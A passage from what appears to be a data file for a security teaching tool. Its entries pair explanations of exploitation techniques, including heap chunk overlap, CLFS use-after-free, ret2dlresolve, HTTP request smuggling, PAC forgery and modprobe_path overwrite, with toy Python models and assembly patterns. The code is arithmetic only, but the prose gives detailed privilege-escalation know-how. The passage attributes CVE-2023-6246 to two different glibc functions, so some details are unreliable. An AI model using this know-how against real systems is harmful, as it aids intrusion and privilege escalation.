      'chunk is later freed, malloc\'s consolidation logic reads the prev_size field (normally ignored when ' +
      'PREV_INUSE is set) and merges backwards into what it believes is a free predecessor chunk. Because the ' +
      'size was corrupted, the merged free region extends past the original chunk boundaries and overlaps with ' +
      'a third chunk still in use. The next malloc() from this region returns a pointer that aliases the ' +
      'victim chunk, giving the attacker simultaneous read/write access — leaking heap pointers and libc ' +
      'addresses, or overwriting function pointers for code execution. ' +
      'The technique was documented by Google Project Zero in 2014 and remains viable across glibc versions; ' +
      'the how2heap project demonstrates it through glibc 2.35. CVE-2018-6789 (Exim mail server, CVSS 9.8) ' +
      'exploited a single-byte heap overflow in base64 decoding to achieve pre-authentication remote code ' +
      'execution on over 400,000 servers — the attacker corrupted an adjacent chunk\'s size to create ' +
      'overlapping allocations and hijack Exim\'s ACL control structures. The House of Einherjar variant ' +
      'extends this primitive by crafting a precise prev_size value to target a specific consolidation merge ' +
      'distance, and CVE-2023-6246 (glibc __fortify_fail heap overflow) demonstrated a similar single-byte ' +
      'corruption path to privilege escalation. ' +
      'In the assembly, write_data\'s `movl` stores attacker input into each chunk\'s data slot; the ' +
      'null-byte overflow appears as `movl` writing 512 into b\'s size (down from 528, modeling 0x210→0x200) ' +
      'and `movl` zeroing b\'s prev_inuse flag; consolidate_back\'s `addl` merges the corrupted chunk size ' +
      'into the predecessor\'s size field, extending the free region to overlap chunk C; the final `movl` ' +
      'plants 0xDEADBEEF into c\'s prev_size through the overlapping allocation, confirming attacker-' +
      'controlled access to adjacent heap memory.',
    code:
`# CVE pattern: null-byte off-by-one into next chunk size → overlapping alloc
class HeapChunk:
    def __init__(self, size, prev_inuse):
        self.size = size
        self.prev_inuse = prev_inuse
        self.prev_size = 0
        self.data = 0
        self.freed = 0

    def write_data(self, val):
        self.data = val
        return self.data

class MallocState:
    def __init__(self):
        self.free_count = 0
        self.overlap = 0

    def free_chunk(self, chunk):
        chunk.freed = 1
        self.free_count += 1
        return self.free_count

    def consolidate_back(self, freed, prev):
        prev.size += freed.size
        self.overlap = 1
        return prev.size

a = HeapChunk(256, 1)
b = HeapChunk(528, 1)
c = HeapChunk(256, 1)
a.write_data(1094795585)
b.write_data(1111638594)
c.write_data(3735928559)
b.size = 512
b.prev_inuse = 0
b.prev_size = 256
state = MallocState()
state.free_chunk(b)
state.consolidate_back(b, a)
c.data = 0
c.prev_size = 3735928559
leaked = c.prev_size
print(leaked)
`,
    badAsm: {
      patterns: ['movl', 'addl'],
      description: 'write_data\'s movl stores attacker input into each chunk\'s data slot; the null-byte overflow appears as movl writing 512 into b\'s size (corrupted from 528, modeling 0x210→0x200) and movl zeroing b\'s prev_inuse; consolidate_back\'s addl merges the corrupted size into the predecessor, extending the free region past chunk C\'s boundary; the final movl plants 0xDEADBEEF into c\'s prev_size through the overlap',
    },
  },
  {
    id: 'clfs-log-corruption',
    name: 'CLFS LOG FILE CORRUPTION',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Crafted CLFS log file base-block metadata triggers a use-after-free in the Windows kernel driver, granting SYSTEM privileges to any local user.',
    explanation:
      'The Windows Common Log File System (CLFS) driver — clfs.sys — parses on-disk Base Log File (BLF) ' +
      'metadata structures in kernel mode. A crafted BLF file with corrupted container context or client ' +
      'context offsets tricks the driver into freeing a kernel object while retaining an internal pointer ' +
      'to it. When the freed memory is reclaimed via heap spraying (typically NtQuerySystemInformation ' +
      'pool spray), the dangling pointer dereferences attacker-controlled data, granting an arbitrary ' +
      'read/write primitive in kernel space. The attacker then walks the EPROCESS linked list to locate ' +
      'the SYSTEM token and copies it to their own process, achieving full privilege escalation. ' +
      'CLFS has been the single most exploited Windows kernel attack surface since 2022, with at least ' +
      'six zero-day exploits captured in the wild: CVE-2022-24521 (reported by NSA and CrowdStrike), ' +
      'CVE-2022-37969, CVE-2023-23376, CVE-2023-28252 (used by Nokoyawa ransomware to deploy payloads ' +
      'on Windows servers), CVE-2024-49138 (exploited in the wild before December 2024 patch), and ' +
      'CVE-2025-29824 (exploited against IT, financial, and retail targets in the US, Venezuela, Spain, ' +
      'and Saudi Arabia — Microsoft warned of widespread ransomware deployment). All share the same root ' +
      'cause: the CLFS driver trusts on-disk metadata offsets without sufficient bounds validation, and ' +
      'corrupted log files can be created by any unprivileged user via the CreateLogFile API. ' +
      'In the assembly, `movl` stores the original kernel object fields (handler, pool_tag) into stack ' +
      'slots during allocate; release_ctx zeroes them but the dangling pointer in ClfsContext persists — ' +
      '`movl` writes attacker-sprayed values (0xDEADBEEF) into the freed slots and `addl` in deref_stale ' +
      'reads through the same offsets, providing the kernel read/write primitive that enables token theft.',
    code:
`# CVE pattern: CLFS BLF metadata corruption — UAF to SYSTEM token theft
class KernelPool:
    def __init__(self, tag, size):
        self.tag = tag
        self.size = size
        self.handler = 0
        self.pool_tag = 0
        self.freed = 0

    def allocate(self, handler, pool_tag):
        self.handler = handler
        self.pool_tag = pool_tag
        return self.handler

    def release(self):
        self.handler = 0
        self.pool_tag = 0
        self.freed = 1
        return self.freed

class ClfsContext:
    def __init__(self, base_offset):
        self.base_offset = base_offset
        self.container_ctx = 0
        self.stale_ref = 0
        self.corrupted = 0

    def parse_blf(self, pool):
        self.container_ctx = pool.handler
        self.stale_ref = pool.pool_tag
        return self.container_ctx

    def deref_stale(self):
        result = self.container_ctx + self.stale_ref
        self.corrupted = 1
        return result

pool = KernelPool(1129270867, 192)
pool.allocate(4196352, 1129270867)
ctx = ClfsContext(4096)
ctx.parse_blf(pool)
pool.release()
pool.handler = 3735928559
pool.pool_tag = 4196608
leaked = ctx.deref_stale()
print(leaked)
`,
    badAsm: {
      patterns: ['movl', 'addl'],
      description: 'movl stores the kernel object handler and pool_tag into stack slots during allocate; release zeroes them but ClfsContext retains the stale reference — movl writes attacker-sprayed values (0xDEADBEEF) into the freed slots and addl in deref_stale reads through the same dangling offsets, providing the kernel read/write primitive used to steal the SYSTEM token from the EPROCESS list',
    },
  },
  {
    id: 'partial-overwrite',
    name: 'PARTIAL POINTER OVERWRITE',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Single-byte overflow corrupts only the LSB of an adjacent pointer, redirecting it to a nearby attacker-controlled address while bypassing ASLR.',
    explanation:
      'Partial pointer overwrite (CWE-787 / CWE-122 adjacent) exploits x86 little-endian byte ordering to turn ' +
      'a minimal one-byte overflow into a full control-flow hijack without defeating ASLR. On a 64-bit system, ' +
      'ASLR randomizes the upper bytes of code and heap addresses, but the lower 12 bits (page offset) are always ' +
      'deterministic. A single-byte heap or stack overflow spills into the least significant byte of an adjacent ' +
      'pointer — changing only its low 8 bits (256 possible offsets) while leaving the ASLR-randomized upper bytes ' +
      'intact. The attacker heap-grooms a shellcode payload at a known offset within the same 256-byte window as the ' +
      'original target, so the one-byte corruption lands the redirected pointer squarely on their payload. ' +
      'CVE-2021-3156 (sudo Baron Samedit, CVSS 7.8) is the textbook real-world example: an off-by-one heap overflow ' +
      'in sudoedit\'s backslash-escape parsing corrupted the LSB of an adjacent service_user struct pointer. Qualys ' +
      'demonstrated that this single-byte corruption was sufficient to redirect sudo\'s nss_load_library() to an ' +
      'attacker-controlled shared object, achieving root on Ubuntu, Debian, Fedora, and every major Linux distribution ' +
      'without brute-forcing ASLR. The vulnerability existed since July 2011 (sudo 1.8.2). CVE-2018-16865 (systemd-journald, ' +
      'CVSS 7.8) used an alloca-based stack overflow that partially overwrote a return-address byte, redirecting execution ' +
      'within the same code page — Qualys achieved a local root shell in 10 minutes on i386. CVE-2023-6246 (glibc ' +
      '__vsyslog_internal) was also noted as exploitable via partial heap pointer overwrite. ' +
      'In the assembly, movl stores the original fd_ptr into a stack slot; addl in overflow_lsb adds the attacker\'s ' +
      'byte offset (128) to the base pointer, redirecting it within the same page — the upper ASLR-randomized bytes ' +
      'from bk_ptr survive untouched. imull in follow_fd then multiplies the corrupted pointer value as an operand, ' +
      'effectively dereferencing the redirected address into the attacker\'s nearby payload.',
    code:
`# CVE pattern: 1-byte heap overflow corrupts pointer LSB — ASLR bypass
class HeapChunk:
    def __init__(self, size, fd_ptr):
        self.size = size
        self.fd_ptr = fd_ptr
        self.bk_ptr = fd_ptr
        self.written = 0

    def overflow_lsb(self, new_lsb):
        self.fd_ptr = self.bk_ptr + new_lsb
        self.written = 1
        return self.fd_ptr

    def follow_fd(self):
        result = self.fd_ptr * 2
        return result

class Payload:
    def __init__(self, base, shellcode):
        self.base = base
        self.shellcode = shellcode
        self.executed = 0

    def trigger(self, redirected):
        result = redirected + self.shellcode
        self.executed = 1
        return result

chunk = HeapChunk(64, 4196352)
payload = Payload(4196480, 3735928559)
chunk.overflow_lsb(128)
target = chunk.follow_fd()
hijacked = payload.trigger(target)
print(hijacked)
`,
    badAsm: {
      patterns: ['addl', 'imull'],
      description: 'addl in overflow_lsb adds the attacker\'s byte (128) to the base pointer stored in bk_ptr, corrupting only the LSB of fd_ptr while the upper ASLR-randomized bytes survive — imull in follow_fd multiplies the corrupted pointer as an operand, dereferencing the redirected address into attacker-controlled memory at +128 offset without requiring any ASLR information leak',
    },
  },
  {
    id: 'ret2dlresolve',
    name: 'RET2DLRESOLVE',
    severity: 'CRITICAL',
    category: 'Code Execution',
    description: 'Attacker forges fake ELF relocation, symbol, and string table entries to trick the dynamic linker into resolving an arbitrary function — bypassing ASLR without any memory leak.',
    explanation:
      'ret2dlresolve abuses the ELF lazy binding mechanism to resolve attacker-chosen functions (e.g. system()) ' +
      'without knowing libc\'s base address, completely bypassing ASLR. On Linux, the dynamic linker defers symbol ' +
      'resolution until a function is first called — the PLT stub pushes a relocation index onto the stack and ' +
      'jumps to _dl_runtime_resolve. The resolver walks three ELF sections: .rel.plt (Elf64_Rela) to find the ' +
      'relocation entry, .dynsym (Elf64_Sym) to find the symbol, and .dynstr to read the function name string. ' +
      'The attacker overwrites the stack to return into the PLT stub with a crafted relocation index that points ' +
      'past the real .rel.plt into attacker-controlled memory. There, fake Elf64_Rela, Elf64_Sym, and string ' +
      'table entries are staged so that the .dynstr lookup yields "system" instead of the original function name. ' +
      'The resolver dutifully resolves system(), writes its address into the GOT slot, and jumps to it with ' +
      'attacker-supplied arguments (e.g. "/bin/sh"). The technique was first described in Nergal\'s 2001 Phrack ' +
      'paper "Advanced return-into-lib(c)" and is now automated by pwntools\' Ret2dlresolvePayload. It only works ' +
      'under No RELRO or Partial RELRO — Full RELRO marks the GOT read-only at startup. Related dynamic-linker ' +
      'CVEs include CVE-2023-4911 (Looney Tunables — ld.so buffer overflow in GLIBC_TUNABLES parsing, CVSS 7.8) ' +
      'and CVE-2025-4802 (dlopen LD_LIBRARY_PATH bypass in static setuid binaries). ' +
      'In the assembly, the fake relocation index is loaded via movl and added to the section base; the resolver\'s ' +
      'addl computes the symbol name pointer from dynstr_base + name_off, and a second movl writes the resolved ' +
      'address into the GOT slot — from that point every subsequent PLT call jumps to the attacker\'s chosen function.',
    code:
`# CVE pattern: ret2dlresolve — forge ELF entries to hijack lazy binding
class FakeReloc:
    def __init__(self, got_off, sym_idx):
        self.got_off = got_off
        self.sym_idx = sym_idx
        self.r_type = 7
        self.resolved = 0

class FakeSym:
    def __init__(self, name_off):
        self.name_off = name_off
        self.value = 0
        self.bound = 0

def plt_stub(reloc_idx):
    result = reloc_idx + 0
    return result

def dl_fixup(reloc, sym, dynstr_base):
    name_addr = dynstr_base + sym.name_off
    sym.value = name_addr
    sym.bound = 1
    reloc.resolved = sym.value
    return reloc.resolved

plt_base = 4198448
got_slot = 6295552
dynstr = 4196352

fake_r = FakeReloc(got_slot, 42)
fake_s = FakeSym(128)

idx = plt_stub(fake_r.sym_idx)
resolved = dl_fixup(fake_r, fake_s, dynstr)
got_val = fake_r.got_off + resolved
print(got_val)
`,
    badAsm: {
      patterns: ['movl', 'addl'],
      description: 'movl loads the crafted relocation index (sym_idx 42) from the stack — this index points past the real .rel.plt into attacker-controlled memory containing a fake Elf64_Rela and Elf64_Sym chain; addl in dl_fixup computes the name pointer (dynstr_base + name_off) which resolves to "system" instead of the original function, and a final movl writes the resolved libc address into the GOT slot so all subsequent PLT calls jump to the attacker\'s chosen function',
    },
  },
  {
    id: 'http-request-smuggling',
    name: 'HTTP REQUEST SMUGGLING',
    severity: 'CRITICAL',
    category: 'Injection',
    description: 'Conflicting Content-Length and Transfer-Encoding headers cause front-end and back-end servers to disagree on request boundaries, letting an attacker inject a hidden second request.',
    explanation:
      'HTTP request smuggling (CWE-444) exploits ambiguity in how layered HTTP processors — reverse proxies, ' +
      'load balancers, and origin servers — determine where one request ends and the next begins. The HTTP/1.1 ' +
      'spec provides two framing mechanisms: Content-Length (CL) specifies the body size in bytes, and ' +
      'Transfer-Encoding: chunked (TE) uses size-prefixed chunks terminated by a zero-length chunk. When a ' +
      'message contains both headers, compliant servers must prefer TE — but many implementations disagree, ' +
      'creating a desync. In a CL.TE attack, the front-end proxy uses Content-Length and forwards the full ' +
      'body, but the back-end uses Transfer-Encoding and stops reading at the first zero chunk, treating the ' +
      'remaining bytes as the start of a NEW request. This smuggled request bypasses all front-end security — ' +
      'WAF rules, authentication checks, and access controls — because the proxy never sees it as a separate ' +
      'request. CVE-2023-25690 (Apache httpd mod_proxy, CVSS 9.8) allowed request smuggling via crafted ' +
      'request URIs sent through mod_rewrite and mod_proxy, enabling full request and response manipulation. ' +
      'CVE-2024-1135 (Gunicorn, CVSS 7.5) failed to validate conflicting Transfer-Encoding headers, allowing ' +
      'request desynchronization, cache poisoning, and session hijacking. CVE-2024-34350 (Next.js, CVSS 7.5) ' +
      'caused response queue poisoning through inconsistent HTTP request interpretation when rewrites were ' +
      'enabled. ' +
      'In the assembly, the two parsers produce different boundary values via independent movl instructions — ' +
      'cmpl then compares these endpoints, and the subl in the smuggle-length calculation reveals the exact ' +
      'number of bytes that slip past the front-end\'s view into the back-end\'s request queue.',
    code:
`# CVE pattern: HTTP request smuggling — CL.TE desync hides a second request
class HttpMessage:
    def __init__(self, cl_hdr, te_chunk, total):
        self.cl_hdr = cl_hdr
        self.te_chunk = te_chunk
        self.total = total
        self.smuggled = 0

class ProxyParser:
    def __init__(self):
        self.boundary = 0
        self.forwarded = 0

    def parse_cl(self, msg):
        self.boundary = msg.cl_hdr
        self.forwarded = self.boundary
        return self.forwarded

class OriginParser:
    def __init__(self):
        self.boundary = 0
        self.consumed = 0

    def parse_te(self, msg):
        self.boundary = msg.te_chunk
        self.consumed = self.boundary
        return self.consumed

msg = HttpMessage(128, 64, 200)
proxy = ProxyParser()
origin = OriginParser()

front_end = proxy.parse_cl(msg)
back_end = origin.parse_te(msg)

if front_end > back_end:
    msg.smuggled = front_end - back_end

print(msg.smuggled)
`,
    badAsm: {
      patterns: ['movl', 'cmpl', 'subl'],
      description: 'movl loads the Content-Length boundary (128) into the proxy parser and the Transfer-Encoding chunk size (64) into the origin parser — these independent stores produce the desync; cmpl compares the two endpoints, confirming the proxy forwarded more bytes than the origin consumed; subl computes the smuggled byte count (128 - 64 = 64), representing the hidden second request that bypasses all front-end security controls',
    },
  },
  {
    id: 'jop-chain',
    name: 'JUMP-ORIENTED PROGRAMMING',
    severity: 'CRITICAL',
    category: 'Code Execution',
    description: 'Chains indirect-jump gadgets through a dispatcher loop to execute arbitrary code without using return instructions, bypassing shadow-stack and return-address signing defenses.',
    explanation:
      'Jump-Oriented Programming (JOP) is a code-reuse attack that chains short instruction sequences (gadgets) ' +
      'ending in indirect jumps (jmp *%rax, jmp *(%rbx)) instead of the RET instructions used by ROP. A central ' +
      '"dispatcher" gadget acts as a trampoline: it loads the next gadget address from an attacker-controlled ' +
      'dispatch table, jumps to it, and each functional gadget jumps back to the dispatcher after performing ' +
      'its operation. Because no RET instruction is ever executed, JOP completely defeats return-address ' +
      'protections including Intel CET shadow stacks, ARM Pointer Authentication (PAC) on LR, and compiler-based ' +
      'Return Address Protection (RAP). The technique was formalized by Bletsch et al. (ASIACCS 2011), who proved ' +
      'Turing-complete computation using only indirect jumps on x86. In practice, JOP-style forward-edge gadget ' +
      'chains have become essential on platforms where hardware return-address signing blocks traditional ROP: ' +
      'Operation Triangulation (Kaspersky, 2023), a zero-click iOS exploit chain leveraging CVE-2023-32434 ' +
      '(XNU kernel integer overflow), required PAC-aware code-reuse techniques on Apple A-series chips because ' +
      'hardware return-address signing rendered classic ROP infeasible. Modern mitigations like Intel CET Indirect ' +
      'Branch Tracking (IBT) and ARM Branch Target Identification (BTI) attempt to limit JOP by requiring ' +
      'ENDBR64/BTI landing-pad instructions at valid jump targets, but incomplete compiler coverage and gadgets ' +
      'that naturally start with these bytes keep JOP viable on all major architectures. ' +
      'In the assembly, the dispatch loop generates movl (loading the next gadget index from the table), addl ' +
      '(advancing the payload accumulator), and jmp (indirect transfer to the selected gadget) — the complete ' +
      'absence of call/ret pairs is the hallmark distinguishing JOP from traditional ROP.',
    code:
`# CVE pattern: JOP — dispatcher chains jump gadgets without return instructions
class DispatchTable:
    def __init__(self, size):
        self.size = size
        self.index = 0
        self.target = 0
        self.payload = 0

class Gadget:
    def __init__(self, addr, effect):
        self.addr = addr
        self.effect = effect
        self.executed = 0

    def run(self, table):
        self.executed = 1
        table.payload = table.payload + self.effect
        table.index = table.index + 1
        return table.index

table = DispatchTable(4)
g0 = Gadget(4096, 10)
g1 = Gadget(4128, 20)
g2 = Gadget(4160, 30)
g3 = Gadget(4192, 40)

while table.index < table.size:
    target = table.index
    if target == 0:
        table.index = g0.run(table)
    elif target == 1:
        table.index = g1.run(table)
    elif target == 2:
        table.index = g2.run(table)
    else:
        table.index = g3.run(table)

print(table.payload)
`,
    badAsm: {
      patterns: ['movl', 'addl', 'jmp'],
      description: 'movl loads the next gadget index from the dispatch table into a register — this is the dispatcher reading the attacker-controlled jump target; addl advances the payload accumulator inside each gadget, simulating the side-effect of each functional gadget in the chain; jmp performs the indirect control-flow transfer to the selected gadget without touching the return stack — the complete absence of call/ret pairs is the hallmark of JOP and the reason shadow-stack defenses like Intel CET cannot detect the hijacked control flow',
    },
  },
  {
    id: 'cachewarp-invd',
    name: 'CACHEWARP FAULT INJECTION',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Malicious hypervisor selectively drops dirty cache lines via INVD, reverting security-critical stores and bypassing authentication in encrypted VMs.',
    explanation:
      'CacheWarp (CVE-2023-20592) is a software-based fault injection attack against AMD SEV-ES and SEV-SNP ' +
      'encrypted virtual machines, presented at USENIX Security 2024 by researchers from CISPA Helmholtz Center ' +
      'and Graz University of Technology. The malicious hypervisor issues the x86 INVD instruction to invalidate ' +
      'a CPU cache line without writing it back to memory — silently dropping the VM\'s most recent store to that ' +
      'address on single-store granularity. When the VM reads the variable again, it sees the old (stale) value ' +
      'instead of the value it just wrote. Two primitives enable the attack: "timewarp" resets the return address ' +
      'to re-execute prior code, and "dropforge" reverts a security-critical write to its pre-store value. ' +
      'Researchers demonstrated three attacks: bypassing OpenSSH authentication by dropping the "auth failed" ' +
      'return-value store so the caller sees a stale "success" value; escalating to root by reverting a sudo ' +
      'permission-check flag; and extracting RSA private keys from OpenSSL by dropping a single multiplication ' +
      'step in modular exponentiation. The attack affects AMD EPYC 1st-gen Naples through 3rd-gen Milan; AMD ' +
      'patched Milan via microcode but confirmed Naples and Rome have no fix. 4th-gen Genoa (Zen 4) is not affected. ' +
      'In the assembly, verify\'s movl stores result = 0 (auth failed) into a stack slot, but invd_revert\'s movl ' +
      'overwrites it with the stale pre-write value (1); escalate\'s imull then multiplies the reverted result ' +
      'by 9999 to compute priv_level — root access is granted because the critical "fail" store was silently dropped.',
    code:
`# CVE pattern: INVD drops auth-fail store — stale value bypasses login
class AuthState:
    def __init__(self, default_result):
        self.result = default_result
        self.password_ok = 0
        self.priv_level = 0
        self.session_id = 0

    def verify(self, provided, expected):
        if provided == expected:
            self.password_ok = 1
            self.result = 1
        else:
            self.password_ok = 0
            self.result = 0
        return self.result

    def escalate(self):
        self.priv_level = self.result * 9999
        self.session_id = self.priv_level + 1337
        return self.session_id

class FaultInjector:
    def __init__(self):
        self.faults = 0
        self.target_offset = 0

    def invd_revert(self, state, stale_val):
        state.result = stale_val
        self.faults += 1
        self.target_offset += 1
        return self.faults

state = AuthState(1)
injector = FaultInjector()
state.verify(42, 1337)
injector.invd_revert(state, 1)
hijacked = state.escalate()
print(hijacked)
`,
    badAsm: {
      patterns: ['movl', 'imull'],
      description: 'verify\'s movl stores result = 0 (auth failed) into the stack slot, but invd_revert\'s movl overwrites it with the stale value 1 — escalate\'s imull multiplies the reverted result by 9999 to compute priv_level, granting root access because the hypervisor\'s INVD instruction silently dropped the authentication-failure store',
    },
  },
  {
    id: 'ghostwrite-phys',
    name: 'GHOSTWRITE PHYS BYPASS',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Faulty RISC-V vector store instructions bypass virtual memory translation entirely, writing directly to physical addresses and breaking all OS isolation.',
    explanation:
      'GhostWrite (CVE-2024-44067) is a direct CPU bug in the T-Head XuanTie C910 and C920 RISC-V processors, ' +
      'discovered by CISPA Helmholtz Center researchers via differential fuzz-testing in August 2024. Unlike ' +
      'side-channel or transient-execution attacks, GhostWrite is a straightforward hardware flaw: the non-standard ' +
      'high-order vector store instructions (vse128.v through vse1024.v) illegally use physical addresses instead of ' +
      'virtual addresses as the store target. This means an unprivileged user-space process can write arbitrary data ' +
      'to any physical memory location, completely bypassing the MMU, page tables, and all OS-enforced process ' +
      'isolation. The attacker can overwrite kernel code, other processes\' memory, or MMIO registers to control ' +
      'hardware peripherals such as network cards. The bug is invisible to performance counters because the faulty ' +
      'store bypasses caches entirely. Mitigation requires disabling the entire vector extension, sacrificing roughly ' +
      '77% of the CPU\'s throughput — effectively crippling the chip. The vulnerability cannot be patched in software ' +
      'without this devastating performance cost. In the assembly, safe_store\'s addl computes a translated virtual ' +
      'address and the conditional movl is blocked when permission is zero, but phys_store\'s movl writes directly ' +
      'to the kernel_secret stack slot without any address translation or permission check — modeling how the faulty ' +
      'RISC-V vector store bypasses the MMU to reach raw physical memory.',
    code:
`# CVE pattern: vector store bypasses MMU — raw physical write
class PhysicalMemory:
    def __init__(self):
        self.kernel_secret = 0
        self.user_data = 0
        self.page_table_base = 0
        self.mmio_region = 0

    def translate(self, virt_addr, perm):
        if perm == 0:
            return 0
        return virt_addr + self.page_table_base

    def safe_store(self, virt_addr, value, perm):
        phys = self.translate(virt_addr, perm)
        if phys == 0:
            return 0
        self.user_data = value
        return 1

    def phys_store(self, phys_addr, value):
        self.kernel_secret = value
        self.mmio_region = phys_addr
        return 1

mem = PhysicalMemory()
mem.page_table_base = 4096
mem.kernel_secret = 31337

blocked = mem.safe_store(8192, 42, 0)
print(blocked)

written = mem.phys_store(16, 57005)
print(mem.kernel_secret)
`,
    badAsm: {
      patterns: ['movl', 'addl'],
      description: 'safe_store\'s addl computes a translated virtual address and movl is blocked when permission is 0, but phys_store\'s movl writes directly to the kernel_secret stack slot without any address translation or permission check — modeling how the faulty RISC-V vector store (vse128.v) bypasses the MMU entirely',
    },
  },
  {
    id: 'pac-forgery',
    name: 'PAC FORGERY',
    severity: 'CRITICAL',
    category: 'Code Execution',
    description: 'Speculative execution oracle brute-forces pointer authentication codes, bypassing ARM control-flow integrity to hijack signed pointers.',
    explanation:
      'ARM Pointer Authentication (PA) adds a cryptographic signature — the Pointer Authentication Code — to the ' +
      'upper bits of every code and data pointer, blocking control-flow hijacking even when an attacker has an ' +
      'arbitrary write. The PACMAN attack (MIT CSAIL, ISCA 2022, demonstrated on Apple M1) defeats this by building ' +
      'a speculative PAC oracle: the attacker speculatively authenticates a pointer with a guessed PAC via an AUT ' +
      'instruction, then dereferences it. A correct guess loads a TLB entry observable through a cache timing side ' +
      'channel; an incorrect guess faults silently in the speculative window and leaves no trace. Because the PAC ' +
      'field is only 7–16 bits wide, the full keyspace can be exhausted in seconds without crashing the victim. ' +
      'Once the correct PAC is known, the attacker forges a signed pointer to a ROP gadget or shellcode, converting ' +
      'a memory corruption bug into full control-flow hijack on hardware that was supposed to prevent exactly that. ' +
      'The attack works across privilege boundaries — user-to-kernel forgery was demonstrated — and is unfixable ' +
      'without hardware changes (FEAT_FPAC) because it exploits the fundamental interaction between speculative ' +
      'execution and the TLB. In the assembly, sign_ptr\'s addl and movl compute and embed a PAC into the pointer, ' +
      'but speculative_oracle\'s loop iteratively guesses PAC values via cmpl and conditionally dereferences via ' +
      'movl — modeling the timing oracle that leaks whether each guess matched.',
    code:
`# CVE pattern: speculative PAC oracle brute-forces pointer signature
class PointerAuth:
    def __init__(self):
        self.secret_key = 48879
        self.target_addr = 256
        self.signed_ptr = 0
        self.cache_state = 0

    def sign_ptr(self, addr, ctx):
        pac = (addr * 31 + ctx) % 256
        self.signed_ptr = addr + pac * 256
        return self.signed_ptr

    def auth_ptr(self, ptr, ctx):
        addr = ptr % 256
        pac = ptr / 256
        expected = (addr * 31 + ctx) % 256
        if pac == expected:
            return addr
        return 0

    def speculative_oracle(self, addr, ctx):
        guess = 0
        found = 0
        while guess < 256:
            forged = addr + guess * 256
            result = self.auth_ptr(forged, ctx)
            if result > 0:
                self.cache_state = result
                found = guess
            guess += 1
        return found

pa = PointerAuth()
signed = pa.sign_ptr(16, 7)
print(signed)

forged_pac = pa.speculative_oracle(16, 7)
print(forged_pac)
`,
    badAsm: {
      patterns: ['cmpl', 'movl'],
      description: 'sign_ptr\'s addl and movl embed a real PAC into the pointer, but speculative_oracle\'s cmpl loop iterates 256 guesses and its conditional movl dereferences the forged pointer on a match — modeling the speculative TLB oracle that leaks the correct PAC without crashing, bypassing ARM Pointer Authentication entirely',
    },
  },
  {
    id: 'kaslr-bypass',
    name: 'KASLR BYPASS',
    severity: 'CRITICAL',
    category: 'Information Disclosure',
    description: 'Leaked kernel pointer reveals the randomized base address, defeating address-space layout randomization and enabling precise code-reuse attacks.',
    explanation:
      'Kernel Address Space Layout Randomization (KASLR) shifts the kernel text, modules, and heap to a ' +
      'random base on every boot, forcing attackers to guess addresses. A single leaked kernel pointer — from ' +
      'an uninitialized struct field copied to userspace, a /proc info leak, or a prefetch-timing side channel — ' +
      'shatters this defense: the attacker subtracts the known symbol offset from the leaked value to recover ' +
      'the randomized base, then resolves every kernel symbol at a fixed offset. CVE-2017-18344 leaked kernel ' +
      'stack data via timer_create, and CVE-2022-4543 (EntryBleed) used prefetch timing to locate the kernel ' +
      'text from unprivileged userspace — both yielding the KASLR base as a first step toward privilege ' +
      'escalation. Once the base is known, the attacker builds a precise ROP chain targeting ' +
      'commit_creds(prepare_kernel_cred(0)) to gain root. In the assembly, the subl that recovers the base ' +
      'from the leaked pointer and the addl instructions that compute target addresses are the critical ' +
      'operations — they transform a single disclosure into full kernel symbol resolution.',
    code:
`# CVE pattern: uncleared struct field leaks kernel pointer, breaks KASLR
class KernelSyms:
    def __init__(self, base):
        self.text_base = base
        self.commit_creds = base + 1024
        self.prep_cred = base + 2048
        self.pop_rdi_ret = base + 512
        self.leak_marker = 0

    def resolve(self, offset):
        addr = self.text_base + offset
        return addr

def leak_via_struct():
    real_base = 16384 + 49152
    leaked_field = real_base + 1024
    known_sym_offset = 1024
    recovered_base = leaked_field - known_sym_offset
    return recovered_base

def build_payload(base):
    syms = KernelSyms(base)
    pop_rdi = syms.pop_rdi_ret
    null_arg = 0
    prep = syms.prep_cred
    commit = syms.commit_creds
    chain = pop_rdi + null_arg + prep + commit
    return chain

base = leak_via_struct()
print(base)
payload = build_payload(base)
print(payload)
`,
    badAsm: {
      patterns: ['subl', 'addl'],
      description: 'subl recovers the randomized kernel base by subtracting a known offset from the leaked pointer; addl resolves commit_creds, prepare_kernel_cred, and gadget addresses at fixed offsets — transforming one leaked pointer into a complete ROP chain with precise kernel targets',
    },
  },
  {
    id: 'modprobe-path',
    name: 'MODPROBE PATH OVERWRITE',
    severity: 'CRITICAL',
    category: 'Code Execution',
    description: 'Arbitrary write overwrites the kernel modprobe_path string so executing an unknown binary format triggers attacker code as root.',
    explanation:
      'The Linux kernel stores the path to the module-loading binary in a writable global variable ' +
      'modprobe_path (default "/sbin/modprobe"). When a user executes a file with an unrecognized binary ' +
      'format (magic bytes like 0xFFFFFFFF), the kernel calls search_binary_handler() which invokes ' +
      'request_module() then call_usermodehelper_exec() — executing whatever path is stored in ' +
      'modprobe_path as a child of the kernel workqueue with full root capabilities. An attacker who ' +
      'gains any arbitrary-write primitive — from a heap overflow, use-after-free, or type confusion — ' +
      'overwrites modprobe_path to point to a malicious shell script (e.g. "/tmp/pwn.sh"), then triggers ' +
      'execution of a dummy file with unknown magic bytes. The kernel runs the attacker\'s script as root. ' +
      'CVE-2022-0185 (Linux fs_context heap overflow) used modprobe_path overwrite for container escape ' +
      'to root. CVE-2022-34918 (nf_tables type confusion) and CVE-2024-1086 (netfilter double-free, ' +
      'actively exploited in ransomware campaigns by RansomHub and Akira) both chained into modprobe_path ' +
      'for local privilege escalation. CVE-2025-0927 (HFS+ OOB write) used the same technique. ' +
      'In the assembly, movl writes the attacker-controlled path value into the modprobe_path slot; ' +
      'addl in trigger_exec combines the overwritten path with the exec flag — no integrity check guards ' +
      'the global, so the kernel blindly executes the attacker\'s script with UID 0.',
    code:
`# CVE pattern: overwrite modprobe_path — kernel execs attacker script as root
class KernelGlobal:
    def __init__(self, modprobe, core_pattern):
        self.modprobe = modprobe
        self.core_pattern = core_pattern
        self.overwritten = 0

    def arb_write(self, new_path):
        self.modprobe = new_path
        self.overwritten = 1
        return self.overwritten

class UserModeHelper:
    def __init__(self, uid):
        self.uid = uid
        self.exec_count = 0
        self.last_path = 0

    def trigger_exec(self, kglob):
        self.last_path = kglob.modprobe + self.uid
        self.exec_count += 1
        return self.last_path

    def check_result(self):
        result = self.last_path + self.exec_count
        return result

kern = KernelGlobal(4214784, 4214848)
